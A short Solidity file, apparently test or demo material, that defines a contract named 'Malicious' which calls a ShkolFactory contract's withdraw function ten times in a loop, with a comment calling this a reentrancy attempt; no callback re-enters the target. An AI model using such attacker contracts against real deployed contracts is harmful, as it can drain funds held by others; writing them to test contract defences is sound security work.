// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ShkolFactory} from "./ShkolFactory.sol";

contract Malicious {
    ShkolFactory public shkolFactory;

    constructor(address payable _shkolFactoryAddress) {
        shkolFactory = ShkolFactory(_shkolFactoryAddress);
    }

    function reentranceAttack(uint256 _withdrawAmount) external {
        // Malicious contract attempts reentrancy by calling ShkolFactory's withdraw function repeatedly
        for (uint256 i = 0; i < 10; i++) {
            shkolFactory.withdraw(_withdrawAmount);
        }
    }
}